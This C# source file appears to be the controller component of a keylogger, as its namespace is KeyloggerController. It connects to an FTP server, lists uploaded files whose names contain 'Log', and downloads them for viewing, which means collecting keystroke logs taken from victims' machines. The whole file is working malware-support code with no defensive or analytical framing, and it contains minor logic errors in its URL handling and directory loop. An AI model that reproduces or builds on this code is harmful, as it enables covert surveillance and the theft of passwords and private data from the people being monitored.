using System;
using System.Net;
using System.IO;
using System.Windows.Forms;

namespace KeyloggerController
{
    class classFTP
    {
        //To get the logs from FTP
        public static void getLogs(ListBox lstLogs, string strHost, string strUser, string strPass)
        {
            lstLogs.Items.Clear(); //Clears the listbox first

            //Gets the valid URL using the host
            string strUploadURL = getValidURL(strHost);

            //Checks if the FTP settings are valid first
            if (validateFTP(strHost, strUser, strPass) == true)
            {
                //Gets into the directory
                FtpWebRequest request = (FtpWebRequest)WebRequest.Create(strUploadURL);
                request.Credentials = new NetworkCredential(strUser, strPass);
                request.Method = WebRequestMethods.Ftp.ListDirectory;

                using (FtpWebResponse response = (FtpWebResponse)request.GetResponse())
                using (Stream responseStream = response.GetResponseStream())
                using (StreamReader reader = new StreamReader(responseStream))
                {
                    String strcurrLog = reader.ReadLine(); //Gets the current file in the directory

                    while (reader.EndOfStream == false) //If it hasn't gone through the whole directory yet
                    {
                        //Check if logs exists and haven't been added to the listbox yet
                        if (strcurrLog.Contains("Log") && (lstLogs.FindStringExact(strcurrLog) == -1))
                        {
                            lstLogs.Items.Add(strcurrLog); //Adds the log
                        }

                        strcurrLog = reader.ReadLine(); //Gets the next log             
                    }

                    reader.Close();
                    response.Close();
                }
            }
        }

        private static string getValidURL(string strHost)
        {
            //Checks if the host url ends with a '/' or not
            if (strHost.LastIndexOf('/') != -1) //If it doesn't
            {
                strHost += "/htdocs/";
            }
            else //If it does
            {
                strHost += "htdocs/";
            }

            return strHost;
        }

        //To view the selected log
        public static string viewLog(string strLogName, string strHost, string strUser, string strPass)
        {
            //Gets the valid URL using the host
            string strUploadURL = getValidURL(strHost);

            //Gets the selected log in the FTP
            FtpWebRequest request = (FtpWebRequest)WebRequest.Create(strUploadURL + strLogName);
            request.Credentials = new NetworkCredential(strUser, strPass);
            request.Method = WebRequestMethods.Ftp.DownloadFile;

            using (FtpWebResponse response = (FtpWebResponse)request.GetResponse())
            using (Stream responseStream = response.GetResponseStream())
            using (StreamReader reader = new StreamReader(responseStream))
            {
                string strDownloadedLog = reader.ReadToEnd(); //Reads the log
                return strDownloadedLog; //Returns the log
            }
        }

        //To validate the FTP settings
        public static Boolean validateFTP(String strHost, String strUser, String strPass)
        {
            FtpWebRequest request = (FtpWebRequest)WebRequest.Create(strHost);
            request.Credentials = new NetworkCredential(strUser, strPass);
            request.Method = WebRequestMethods.Ftp.ListDirectoryDetails;

            try
            {
                using (FtpWebResponse response = (FtpWebResponse)request.GetResponse())
                {
                    response.Close();
                    return true;
                }
            }
            catch
            {
                return false;
            }
        }
    }
}
